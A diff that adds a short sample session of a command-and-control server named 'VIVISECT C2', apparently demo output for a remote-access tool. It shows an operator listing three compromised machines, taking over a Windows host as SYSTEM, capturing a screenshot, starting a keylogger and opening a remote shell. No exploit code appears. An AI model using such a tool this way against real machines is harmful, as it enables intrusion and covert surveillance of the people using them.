@@ -1,0 +1,29 @@
+┌─────────────────────────────────────────────┐
+│             VIVISECT C2 SERVER              │
+│  Listening on 0.0.0.0:4444                  │
+├─────────────────────────────────────────────┤
+│  [1] 192.168.1.42   Windows 10   ONLINE     │
+│  [2] 10.0.0.138     Ubuntu 22.04  ONLINE    │
+│  [3] 172.16.0.10    Router       ONLINE    │
+└─────────────────────────────────────────────┘
+
+C2> list
+[1] Windows10-PC   x86_64   192.168.1.42
+[2] ubuntu-server  x86_64   10.0.0.138
+[3] router         armv7l   172.16.0.10
+
+C2> select 1
+[+] Connected to Windows10-PC (192.168.1.42)
+
+C2[Windows10-PC]> whoami
+nt authority\system
+
+C2[Windows10-PC]> screenshot
+[+] Screenshot saved: screenshots/win10_2026.png
+
+C2[Windows10-PC]> keylog start
+[+] Keylogger started
+
+C2[Windows10-PC]> shell
+Microsoft Windows [Version 10.0.19045.3803]
+C:\Windows\system32> dir
